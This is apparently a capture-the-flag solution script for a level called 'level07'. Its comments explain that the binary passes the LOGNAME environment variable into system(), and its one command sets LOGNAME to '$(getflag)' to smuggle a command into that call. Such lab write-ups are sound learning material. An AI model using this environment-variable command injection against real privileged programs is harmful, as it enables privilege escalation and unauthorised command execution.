#!/bin/sh

# $> strings level07
# level07 calls
# asprintf(&str,"/bin/echo %s ",getenv("LOGNAME"));
# system calls the string created by asprintf

LOGNAME='$(getflag)' /home/user/level07/level07

